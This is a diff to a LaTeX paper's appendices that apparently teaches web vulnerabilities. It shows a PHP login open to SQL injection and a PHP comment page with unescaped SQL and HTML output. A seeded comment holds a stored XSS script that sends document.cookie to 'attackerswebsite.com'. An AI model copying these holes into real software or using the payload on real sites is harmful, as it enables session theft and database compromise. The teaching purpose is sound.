@@ -612,7 +612,7 @@ continue studying it in the future.
 \appendix
 \section{SQL injection example}
 
-\subsection{HTML code}
+\subsection{index.html}
 \begin{minted}{html}
 <!DOCTYPE HTML>
 <html>
@@ -642,7 +642,7 @@ input {
 \end{minted}
 \newpage
 
-\subsection{PHP code}
+\subsection{login.php}
 \begin{minted}{php}
 <?php
    class MyDB extends SQLite3 {
@@ -651,27 +651,25 @@ input {
       }
    }
 
-   if(isset($_POST['email'], $_POST['pass']))
-   {
+   if (isset($_POST['email'], $_POST['pass'])) {
 	$email = $_POST['email'];
 	$pass = $_POST['pass'];
 
 	$db = new MyDB();
 
-	$sql = 'SELECT * FROM Users WHERE email=\''.$email.
-    '\' AND password=\''.$pass.'\'';
-
+	$sql = 'SELECT * FROM Users WHERE email=\'' . $email .
+    	   '\' AND password=\'' . $pass . '\'';
 	$ret = $db->query($sql);
-	while($row = $ret->fetchArray(SQLITE3_ASSOC)) {
-		echo 'Logged in as '.$row['email'].'<br>';
-	}
+	while ($row = $ret->fetchArray(SQLITE3_ASSOC))
+		echo 'Logged in as ' . $row['email'] . '<br>';
+
 	$db->close();
    }
 ?>
 \end{minted}
 \newpage
 
-\subsection{SQL code}
+\subsection{users.db}
 \begin{minted}{sql}
 CREATE TABLE Users (
 	email varchar(32),
@@ -682,5 +680,65 @@ INSERT INTO Users VALUES('test@mail.com','password');
 INSERT INTO Users VALUES('marcin@mail.com','pass');
 \end{minted}
 \newpage
+
+\appendix
+\section{Cross-Site Scripting (XSS) example}
+
+\subsection{index.php}
+\begin{minted}{php}
+<?php
+	class MyDB extends SQLite3 {
+      function __construct() {
+         $this->open('comments.db');
+      }
+   }
+
+	if (isset($_POST['user'], $_POST['comment'])) {
+		$user = $_POST['user'];
+		$comment = $_POST['comment'];
+
+		$db = new MyDB();
+
+		$sql = 'INSERT INTO Comments VALUES(\'' . $user . '\',\'' .
+        	       $comment . '\')';
+		$ret = $db->exec($sql);
+		$db->close();
+	}
+
+	echo '<!DOCTYPE HTML><html><head><title>Comments</title>' .
+	   	 '<meta charset="utf-8"></head><body><h1>Comments</h1>';
+
+	$db = new MyDB();
+
+	$sql = 'SELECT * FROM Comments';
+	$ret = $db->query($sql);
+	while ($row = $ret->fetchArray(SQLITE3_ASSOC))
+		echo '<p><b>' . $row['user'] . '</b> says:<br>' .
+        	      $row['comment'] . '</p>';
+
+	$db->close();
+
+	echo '<h2>Add comment</h1><form action="index.php" method="post">' .
+	     '<input type="text" name="user" placeholder="User name"><br>' .
+	     '<input type="text" name="comment" placeholder="Comment"><br>' .
+	     '<input type="submit" value="Add"><br>' .
+	     '</form></body></html>';
+?>
+\end{minted}
+\newpage
+
+\subsection{comments.db}
+\begin{minted}{sql}
+CREATE TABLE Comments(
+	user varchar(32),
+	comment varchar(255)
+);
+
+INSERT INTO Comments VALUES('user1','Hello world!');
+INSERT INTO Comments VALUES('user2','test');
+INSERT INTO Comments VALUES('attacker','hello
+<script>document.createElement("img").src =
+"http://attackerswebsite.com/" + document.cookie</script>');
+\end{minted}
 
 \end{document}
